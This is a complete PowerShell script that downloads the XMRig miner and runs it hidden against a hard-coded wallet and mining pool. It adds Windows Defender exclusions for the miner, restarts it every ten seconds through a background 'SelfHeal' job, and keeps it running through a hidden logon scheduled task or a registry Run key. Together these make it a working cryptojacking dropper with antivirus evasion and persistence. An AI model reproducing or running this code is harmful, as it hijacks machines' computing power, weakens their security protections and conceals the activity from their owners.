

$wallet = "LTC:{LSNtid3eWFWK9q2tEf41QkajnqAaLsoWRZ}.Worker01"
$cpuLimitPercent = 40
$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-win64-msvc.zip"

$basePath = "$env:USERPROFILE\xmrig"
$zipPath = "$basePath\xmrig.zip"
$extractPath = "$basePath"
$minerExe = "$basePath\xmrig-6.20.0\xmrig.exe"


if (-not (Test-Path $basePath)) {
    New-Item -ItemType Directory -Path $basePath -Force | Out-Null
}

# 2. Download & Extract Miner (if not already done)
if (-not (Test-Path $minerExe)) {
    Write-Host "Downloading Miner to $basePath (one-time only)..." -ForegroundColor DarkGray
    try {
        Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath -UseBasicParsing
        Write-Host "Extracting..." -ForegroundColor DarkGray
        Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
        Write-Host "Extraction complete." -ForegroundColor Green
    } catch {
        Write-Host "Error downloading miner. Check internet configuration or antivirus blocking." -ForegroundColor Red
        exit
    }
}

try {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Add-MpPreference -ExclusionPath "$env:USERPROFILE\xmrig" -ErrorAction Stop
        Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction Stop
        Write-Host "Defender exclusions applied (folder + process)." -ForegroundColor Green
    } else {
        Write-Host "Not running elevated - skipping Defender exclusions." -ForegroundColor Yellow
        Write-Host "To apply them, run once as Admin:" -ForegroundColor Yellow
        Write-Host '    Add-MpPreference -ExclusionPath "$env:USERPROFILE\xmrig"' -ForegroundColor Yellow
        Write-Host '    Add-MpPreference -ExclusionProcess "xmrig.exe"' -ForegroundColor Yellow
    }
} catch {
    Write-Host "Could not apply Defender exclusions: $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "(May be blocked by Tamper Protection or Group Policy.)" -ForegroundColor Yellow
}


$totalCores = (Get-CimInstance -ClassName Win32_Processor | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum
$threads = [Math]::Max(1, [Math]::Ceiling($totalCores * ($cpuLimitPercent / 100)))

# 4. Function to start miner 
function Start-Miner {
    $proc = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if (-not $proc) {
        Write-Host "Starting miner with $threads threads..." -ForegroundColor Green
        $minerArgs = @(
            "--url", "rx.unmineable.com:3333",
            "--algo", "rx",  
            "--user", $wallet,
            "--pass", "x",
            "--threads", $threads,
            "--donate-level", "1",
            "-k"
        )
        Start-Process -FilePath $minerExe -ArgumentList $minerArgs -WindowStyle Hidden
    }
}


$oldJob = Get-Job -Name "SelfHeal" -ErrorAction SilentlyContinue
if ($oldJob) { Stop-Job $oldJob | Remove-Job }

Start-Job -ScriptBlock {
    param($minerExe, $wallet, $threads)
    while ($true) {
        $miner = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
        if (-not $miner) {
            $args = @(
                "--url", "rx.unmineable.com:3333",  
                "--user", $wallet,
                "--algo", "rx",
                "--pass", "x",
                "--threads", $threads,
                "--donate-level", "1",
                "-k"
            )
            Start-Process -FilePath $minerExe -ArgumentList $args -WindowStyle Hidden
        }
        Start-Sleep -Seconds 10
    }
} -ArgumentList $minerExe, $wallet, $threads -Name "SelfHeal"

Start-Miner


$taskName = "XMRig-Miner"

$scriptPath = $MyInvocation.MyCommand.Path
if (-not $scriptPath -or $scriptPath -ne "$basePath\start-miner.ps1") {
    if ($scriptPath -and (Test-Path $scriptPath)) {
        Copy-Item -Path $scriptPath -Destination "$basePath\start-miner.ps1" -Force
    }
    $scriptPath = "$basePath\start-miner.ps1"
}

$startupArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""

try {
    $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $startupArgs
    $trigger  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    Write-Host "Startup task '$taskName' registered (runs hidden at logon)." -ForegroundColor Green
} catch {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value "powershell.exe $startupArgs"
    Write-Host "Scheduled task failed ($($_.Exception.Message))." -ForegroundColor Yellow
    Write-Host "Registered via HKCU Run key instead." -ForegroundColor Yellow
}


Write-Host "Miner process initialized. Background monitoring job 'SelfHeal' is active." -ForegroundColor Cyan
Write-Host "Miner installed at: $basePath" -ForegroundColor Yellow
Write-Host "Startup registration: '$taskName'" -ForegroundColor Yellow
Write-Host "To review or modify settings, end the 'xmrig' process or stop the PowerShell script." -ForegroundColor DarkGray